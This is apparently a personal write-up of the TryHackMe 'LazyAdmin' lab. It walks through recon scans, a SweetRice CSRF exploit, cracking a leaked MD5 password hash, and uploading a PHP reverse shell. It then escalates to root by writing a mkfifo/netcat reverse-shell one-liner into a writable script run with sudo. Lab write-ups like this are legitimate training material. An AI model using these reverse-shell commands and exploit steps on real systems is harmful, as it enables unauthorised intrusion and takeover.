# LazyAdmin

```bash
export IP=10.10.216.244
```

## Scans

### Nmap

Command:
```bash
mmap -sC -sV -oN scans/nmap.initial $IP
```

Open Ports found:
```
22 -- ssh
80 -- webpage
```

URL found in page source:`https://bugs.launchpad.net/ubuntu/+source/apache2/+bug/1288690`


### Gobuster

Command:
```bash
gobuster dir -w wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP
```

Directories found:
```
/content
```

URL found in /content: `http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/`


### Nikto

Command:
```bash
nikto -host $IP
```

## Searchsploit

Command:
```bash
searchsploit SweetRice
```

Command: to see more info or *examine* an exploit
```bash
searchsploit -x /path/to/exploit.html
```

this exploit is uploadable and offers a login page:
```
SweetRice 1.5.1 - Cross-Site Request Forgery
```

Command: to copy an exploit
```bash
searchsploit -m /path/to/exploit.html
```


this exploit explains the location of a backup .sql file in `/content/inc/mysql_backup`:
```
SweetRice 1.5.1 - Backup disclosure
```

found in `/content/inc/mysql_backup`:

username and hash found: `manager:42f749ade7f9e195bf475f37a44cafcb`

run through `crackstation.net` reveals MD5 hash and password `Password123`


## Exploit
Command: runs the exploit and opens the login page -- Proof Of Concept
```bash
firefox exploit.html
```

check `/content/inc/ads/hacked.php` to see if php 'hacked' info  page is loaded in

if so: copy `revshell.php` code into `exploit.html`, remember to change $IP and $port and $value

start netcat listening port:
```bash
nc -lnvp 8888
```

Command: opens the login page as a background process and injects php reverse shell
```bash
firefox exploit.html &
firefox exploit.html
```

Visit `http://$IP/content/inc/ads/revshell.php` to spawn shell


### Upgrading to a tty shell

Command: uses `/usr/bin/script`, so no need for Python
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

To stabilize shell: (type carefully, beware of typos)
```bash
<Ctrl><Z>
stty raw -echo
<F><G>
nc -lnvp 8888
export TERM=xterm
```

**User Flag Found**: `THM{63e5bce9271952aad1113b6f1ac28a07}`


## PrivEsc

Searching for files with SUID privilege shows `/usr/bin/perl /home/itguy/backup.pl`

It is not writeable, but it calls on `/etc/copy.sh` which is writeable

so edit it with nano and add: learned from -- [PentestMonkey cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 7777 >/tmp/f
```

Remember to change `$IP` and **new** listening `$port`.

then starting the **new** netcat listening port:
```bash
nc -lnvp 7777
```

On Target Machine:
```bash
sudo -l
sudo /usr/bin/perl /home/itguy/backup.pl
```

Root access shell achieved

To stabilize shell: (type carefully, beware of typos)
```bash
<Ctrl><z>
stty raw -echo
<f><g>
nc -lnvp 7777
export TERM=xterm
```

TTY upgrade:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```


**Root Flag Found**: `THM{6637f41d0177b6f37cb20d775124699f}`

---
[back to TryHackMe main page](thm.md)

[back to Index/Table of Contents](index.md)
